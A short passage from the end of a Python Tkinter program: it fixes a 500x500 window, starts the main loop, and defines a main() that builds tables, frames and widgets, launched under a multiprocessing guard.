    root.minsize(500, 500)
    root.maxsize(500, 500)
    root.mainloop()
    
    

def main():
    tables()
    frames()
    widgets()
    end()



if __name__=="__main__":
    freeze_support()
    pool=Pool(3)
    main()
